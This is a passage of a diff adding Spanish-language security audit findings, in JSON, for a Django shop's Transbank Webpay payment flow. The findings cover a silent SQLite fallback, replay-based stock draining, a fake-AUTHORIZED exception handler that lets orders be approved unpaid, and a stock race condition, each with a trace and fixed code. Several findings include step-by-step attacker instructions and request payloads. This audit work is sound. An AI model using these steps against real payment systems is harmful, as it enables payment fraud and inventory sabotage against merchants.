+    "description": "En backend/config/settings.py la funcion check_postgres_connection realiza un sondeo TCP al puerto de PostgreSQL. Si la conexion falla y la variable DB_FALLBACK_SQLITE_IF_PG_UNAVAILABLE esta en True, Django conmuta automaticamente el motor de persistencia a SQLite local (db.sqlite3). En entornos productivos con multiples contenedores efimeros o politicas de respaldo at-rest en PostgreSQL, esta conmutacion silenciosa causaria almacenamiento de datos en archivos planos locales sin replicacion ni auditoria.",
+    "claimed_root_cause": "Logica condicional de seleccion de base de datos en settings.py:105-126 que permite degradar PostgreSQL a SQLite si la conexion inicial no responde en menos de 1 segundo.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/config/settings.py",
+        "line": 89,
+        "scope": "check_postgres_connection",
+        "description": "La funcion sondea host y puerto de PostgreSQL con timeout de 1 segundo."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/config/settings.py",
+        "line": 117,
+        "scope": "DATABASES",
+        "description": "Si falla el sondeo y db_fallback es True, conmuta a django.db.backends.sqlite3."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/config/settings.py",
+        "line": 121,
+        "scope": "DATABASES",
+        "description": "Django inicializa el backend utilizando el archivo local db.sqlite3."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/config/settings.py",
+        "line": 117,
+        "description": "elif db_fallback: DATABASES = {\"default\": {\"ENGINE\": \"django.db.backends.sqlite3\", ...}}"
+      }
+    ],
+    "blockers": [
+      "Requiere validar si en el servidor productivo la variable DB_FALLBACK_SQLITE_IF_PG_UNAVAILABLE esta forzada a False en el entorno de despliegue."
+    ],
+    "validation_plan": {
+      "local": "Configurar DB_PORT=9999 en .env local y verificar que manage.py inicia con SQLite imprimiendo mensaje de aviso en lugar de abortar.",
+      "deployment": "Inspeccionar los archivos de configuracion de variables de entorno de produccion (Kubernetes ConfigMap, Docker Swarm o AWS Secrets) para confirmar que DB_FALLBACK_SQLITE_IF_PG_UNAVAILABLE sea False."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "transbank.commit.replay-inventory-depletion",
+    "title": "Falta de validacion de estado e idempotencia en confirmacion de pago permite drenar inventario (Replay Attack)",
+    "description": "En TransbankCommitAPIView no se comprueba si la orden ya se encuentra en estado AUTHORIZED antes de procesar el commit. Un atacante puede reenviar la solicitud de confirmacion con el mismo token de pago multiples veces, ejecutando repetidamente el descuento de stock para cada item de la orden hasta agotar completamente el inventario del catalogo sin restricciones.",
+    "root_cause": "Ausencia de verificacion de precondicion (order.status != \"AUTHORIZED\") y falta de transaccion atomica con bloqueo select_for_update() en TransbankCommitAPIView (apps/payments/views.py:127-168).",
+    "intended_behavior": "El endpoint debe verificar que la orden este en estado INITIALIZED. Si ya fue autorizada o fallida, debe rechazar peticiones adicionales con un error 400 Bad Request indicando que la transaccion ya concluyo, asegurando idempotencia.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/payments/views.py",
+        "line": 127,
+        "scope": "TransbankCommitAPIView.post",
+        "description": "Se recibe una peticion POST de confirmacion de pago con un token cuya orden ya fue autorizada con anterioridad."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/payments/views.py",
+        "line": 133,
+        "scope": "TransbankCommitAPIView.post",
+        "description": "La orden se recupera de la base de datos sin validar su estado actual ni adquirir un bloqueo pesimista."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/payments/views.py",
+        "line": 149,
+        "scope": "TransbankCommitAPIView.post",
+        "description": "Se ejecuta el bucle de descuento de stock de productos restando unidades nuevamente en cada peticion sucesiva."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/payments/views.py",
+        "line": 141,
+        "description": "El flujo de autorizacion procede directamente sin verificar si order.status == \"AUTHORIZED\"."
+      },
+      {
+        "file": "backend/apps/payments/views.py",
+        "line": 152,
+        "description": "prod.stock -= item.quantity ejecutado sin clausula select_for_update() ni verificacion de estado previo de la orden."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "data_state",
+        "description": "Existe una orden asociada a un token en estado AUTHORIZED."
+      },
+      {
+        "kind": "system_configuration",
+        "description": "TransbankCommitAPIView permite reenvios del mismo token sin comprobacion de idempotencia."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Un atacante que dispone de un token de compra realiza multiples llamadas POST concurrentes o secuenciales a /api/v1/payments/transbank/commit/ para vaciar el inventario de los productos de la tienda.",
+      "payloads": [
+        "{\"token\": \"valid_order_transbank_token\"}"
+      ],
+      "instructions": [
+        "1. Inicializar una orden con un producto que posea stock de 5 unidades.",
+        "2. Confirmar la orden por primera vez; el stock baja a 4.",
+        "3. Reenviar la misma peticion de confirmacion 4 veces consecutivas con el mismo token.",
+        "4. Verificar en base de datos que el stock se reduce sucesivamente a 3, 2, 1 y finalmente 0."
+      ],
+      "observed_result": "El stock del producto se descuenta en cada peticion repetida hasta llegar a 0, dejando el producto desabastecido para clientes legitimos."
+    },
+    "remediation": {
+      "strategy": "Validar explicitamente que la orden se encuentre en estado INITIALIZED y envolver la operacion en una transaccion atomica (@transaction.atomic) con select_for_update() para evitar condiciones de carrera y ataques de repeticion.",
+      "code_changes": [
+        {
+          "file_name": "backend/apps/payments/views.py",
+          "fixed_code": "with transaction.atomic():\n    order = Order.objects.select_for_update().filter(transbank_token=token).first()\n    if not order:\n        return Response({\"status\": \"fail\", \"message\": \"No se encontro orden.\"}, status=404)\n    if order.status == \"AUTHORIZED\":\n        return Response({\"status\": \"fail\", \"message\": \"Esta orden ya fue procesada y autorizada previamente.\"}, status=400)"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "high",
+        "reason": "Es trivial automatizar solicitudes POST repetitivas contra la API una vez obtenido un token de pago."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Permite provocar una denegacion de servicio comercial mediante desabastecimiento artificial del catalogo (Denial of Inventory)."
+      },
+      "overall_severity": "high"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Verificado directamente en el codigo fuente de TransbankCommitAPIView."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "transbank.commit.unconditional-authorization-bypass",
+    "title": "Bypass de autorizacion de pago y aprobacion incondicional en Transbank Webpay Plus",
+    "description": "La funcion TransbankWebpayService.commit_transaction captura cualquier excepcion lanzada durante tx.commit (incluyendo errores HTTP 401 Not Authorized, tokens inexistentes, expirados o impagos) y de forma incondicional continua su ejecucion retornando un diccionario falso con status AUTHORIZED y codigo de autorizacion generado. La vista TransbankCommitAPIView confia ciegamente en este valor, marcando la orden de compra como pagada y aprobada y descontando el stock del inventario sin haber recibido confirmacion ni transferencia de fondos de la pasarela bancaria.",
+    "root_cause": "Captura generica de excepciones sin propagacion de error en TransbankWebpayService.commit_transaction (apps/payments/services.py:122-147) que retorna de manera estatica un estado AUTHORIZED simulado cuando la llamada a la API de Transbank falla o no autoriza la transaccion.",
+    "intended_behavior": "Si la llamada tx.commit(token) falla, lanza excepcion o Transbank no retorna response_code == 0, la funcion debe retornar un estado REJECTED o lanzar un error de validacion, y la vista debe marcar la orden como FAILED sin emitir voucher ni rebajar stock.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/payments/views.py",
+        "line": 127,
+        "scope": "TransbankCommitAPIView.post",
+        "description": "El cliente envia el token de pago obtenido en la inicializacion directamente al endpoint POST /api/v1/payments/transbank/commit/ sin haber completado la transaccion en Webpay."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/payments/services.py",
+        "line": 124,
+        "scope": "TransbankWebpayService.commit_transaction",
+        "description": "La pasarela Transbank rechaza la consulta de confirmacion o lanza excepcion 401 Not Authorized debido a que el pago no fue efectuado o las credenciales no son validas."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/payments/services.py",
+        "line": 139,
+        "scope": "TransbankWebpayService.commit_transaction",
+        "description": "El bloque except captura la excepcion y ejecuta la rama de fallback retornando status AUTHORIZED con authorization_code simulado."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/payments/views.py",
+        "line": 141,
+        "scope": "TransbankCommitAPIView.post",
+        "description": "La vista evalua commit_result.get(\"status\") == \"AUTHORIZED\", actualiza order.status a AUTHORIZED, descuenta el stock de los productos y emite un voucher exitoso."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/payments/services.py",
+        "line": 135,
+        "description": "Bloque except Exception as e en commit_transaction que silencia el error y retorna dict con status AUTHORIZED."
+      },
+      {
+        "file": "backend/apps/payments/views.py",
+        "line": 146,
+        "description": "Asignacion incondicional de order.status = AUTHORIZED y descuento en base de datos tras recibir el estado simulado."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "system_configuration",
+        "description": "El backend procesa pagos mediante TransbankWebpayService sin forzar verificacion estricta de entorno productivo."
+      },
+      {
+        "kind": "user_interaction",
+        "description": "El cliente invoca el endpoint de confirmacion de pago enviando el token de transaccion inicializado."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Un atacante anonimo agrega productos de alto valor al carrito, inicializa la transaccion en /api/v1/payments/transbank/init/ y con el token recibido ejecuta directamente POST /api/v1/payments/transbank/commit/. Obtiene una orden aprobada y comprobante valido sin haber pagado un solo peso.",
+      "payloads": [
+        "{\"token\": \"tbk_token_arbitrary_value_12345\"}"
+      ],
+      "instructions": [
+        "1. Ejecutar POST /api/v1/payments/transbank/init/ con cualquier item del catalogo.",
+        "2. Capturar el token de la respuesta JSON.",
+        "3. Ejecutar POST /api/v1/payments/transbank/commit/ enviando {\"token\": \"<token>\"} sin ingresar a Transbank.",
+        "4. Observar respuesta HTTP 200 con voucher APROBADO y orden en estado AUTHORIZED en base de datos."
+      ],
+      "observed_result": "El endpoint retorna HTTP 200 con mensaje \"Pago aprobado exitosamente mediante Transbank Webpay Plus\", codigo de autorizacion simulado y descuenta el inventario fisico en PostgreSQL."
+    },
+    "remediation": {
+      "strategy": "Eliminar el bloque de fallback simulado en commit_transaction y asegurar que cualquier excepcion o error de Transbank retorne explicitamente status REJECTED o propague un error fatal que impida la autorizacion de la orden.",
+      "code_changes": [
+        {
+          "file_name": "backend/apps/payments/services.py",
+          "fixed_code": "def commit_transaction(self, token: str):\n    tx = self.get_tx()\n    if not tx or token.startswith(\"tbk_token_\"):\n        return {\"status\": \"REJECTED\", \"response_code\": -1, \"message\": \"SDK de Transbank no disponible o token invalido.\"}\n    try:\n        response = tx.commit(token)\n        resp_dict = response if isinstance(response, dict) else response.__dict__\n        is_approved = resp_dict.get(\"response_code\") == 0\n        return {\n            \"response_code\": resp_dict.get(\"response_code\"),\n            \"authorization_code\": resp_dict.get(\"authorization_code\"),\n            \"amount\": resp_dict.get(\"amount\"),\n            \"card_number\": resp_dict.get(\"card_detail\", {}).get(\"card_number\"),\n            \"payment_type_code\": resp_dict.get(\"payment_type_code\"),\n            \"shares_number\": resp_dict.get(\"shares_number\", 1),\n            \"status\": \"AUTHORIZED\" if is_approved else \"REJECTED\"\n        }\n    except Exception as e:\n        return {\"status\": \"REJECTED\", \"response_code\": -1, \"error\": str(e)}"
+        }
+      ]
+    },
+    "severity": {
+      "likelihood": {
+        "score": "critical",
+        "reason": "Cualquier usuario anonimo puede reproducir el ataque directamente con herramientas HTTP como curl o la propia interfaz web."
+      },
+      "impact": {
+        "score": "critical",
+        "reason": "Perdida financiera total para el comercio al autorizar compras fraudulentas y entregar mercancia sin compensacion economica."
+      },
+      "overall_severity": "critical"
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado y verificado mediante trazabilidad de codigo y reproduccion directa de la funcion commit_transaction en consola Python."
+    }
+  },
+  {
+    "verdict": "confirmed",
+    "fingerprint": "transbank.concurrency.race-condition-stock-depletion",
+    "title": "Condicion de carrera y ausencia de bloqueo transaccional en descuento de stock en confirmacion de pago",
+    "description": "Al confirmar el pago exitoso en TransbankCommitAPIView, el sistema itera sobre los items de la orden y descuenta el inventario de los productos mediante una lectura y asignacion directa en memoria ('product.stock -= item.quantity') seguida de 'product.save()', sin envolver la operacion en una transaccion atomica (transaction.atomic), sin bloqueo pesimista (select_for_update) ni expresiones F de base de datos. Peticiones concurrentes con multiples ordenes sobre un mismo producto con stock reducido provocan colisiones de escritura (lost updates) y sobreventa (overselling).",
+    "root_cause": "Descuento de stock en memoria sin proteccion de concurrencia a nivel de base de datos (backend/apps/payments/views.py:149-154).",
+    "intended_behavior": "El descuento de inventario debe realizarse de forma transaccional y atomica mediante expresiones F ('F(\"stock\") - quantity') o con 'select_for_update()', validando que el inventario remanente no descienda de cero.",
+    "trace": [
+      {
+        "kind": "entrypoint",
+        "file": "backend/apps/payments/views.py",
+        "line": 128,
+        "scope": "TransbankCommitAPIView.post",
+        "description": "Se recibe la notificacion de confirmacion de transaccion Transbank."
+      },
+      {
+        "kind": "propagation",
+        "file": "backend/apps/payments/views.py",
+        "line": 149,
+        "scope": "TransbankCommitAPIView.post",
+        "description": "Se recorren los items de la orden y se descuenta el stock directamente en el objeto Python."
+      },
+      {
+        "kind": "sink",
+        "file": "backend/apps/payments/views.py",
+        "line": 154,
+        "scope": "TransbankCommitAPIView.post",
+        "description": "Se persiste product.save(update_fields=['stock']) sin bloqueo transaccional, sobrescribiendo concurrencias."
+      }
+    ],
+    "evidence": [
+      {
+        "file": "backend/apps/payments/views.py",
+        "line": 152,
+        "description": "product.stock -= item.quantity; product.save(update_fields=['stock']) ejecutado fuera de bloque transaction.atomic."
+      }
+    ],
+    "conditions": [
+      {
+        "kind": "timing_dependency",
+        "description": "Dos o mas transacciones de pago sobre el mismo producto confirmadas simultaneamente."
+      }
+    ],
+    "execution": {
+      "attacker_perspective": "Comprador concurrente que adquiere la ultima unidad en simultaneo con otro comprador.",
+      "payloads": [
+        "POST /api/v1/payments/transbank/commit/ con token_1",
+        "POST /api/v1/payments/transbank/commit/ con token_2"
+      ],
+      "instructions": [
+        "1. Crear un producto con stock = 1.",
+        "2. Iniciar dos ordenes de compra independientes para dicho producto.",
+        "3. Enviar solicitudes concurrentes de confirmacion commit simultaneamente.",
+        "4. Verificar el inventario final del producto."
+      ],
+      "observed_result": "Ambas solicitudes leen stock = 1 y escriben stock = 0, autorizando 2 unidades cuando solo existia 1 en inventario."
+    },
+    "severity": {
+      "likelihood": {
+        "score": "medium",
+        "reason": "Ocurre bajo condiciones de alta demanda o eventos comerciales masivos (CyberDay)."
+      },
+      "impact": {
+        "score": "high",
+        "reason": "Sobreventa de productos, incumplimiento comercial y quiebre de stock no controlado."
+      },
+      "overall_severity": "high"
+    },
+    "remediation": {
+      "strategy": "Envolver la confirmacion en 'transaction.atomic()' y utilizar 'select_for_update()' sobre los productos de la orden o 'Product.objects.filter(id=p.id, stock__gte=qty).update(stock=F(\"stock\") - qty)'.",
+      "code_changes": [
+        {
+          "file_name": "backend/apps/payments/views.py",
+          "fixed_code": "with transaction.atomic():\n    order = Order.objects.select_for_update().get(id=order.id)\n    for item in order.items.select_related('product'):\n        updated = Product.objects.filter(id=item.product_id, stock__gte=item.quantity).update(stock=F('stock') - item.quantity)\n        if not updated:\n            raise ValidationError('Stock insuficiente durante la confirmacion')"
+        }
+      ]
+    },
+    "confidence": {
+      "score": "high",
+      "reason": "Confirmado mediante trazabilidad de codigo fuente e inspeccion de flujo de ejecucion."
+    }
+  }
+]
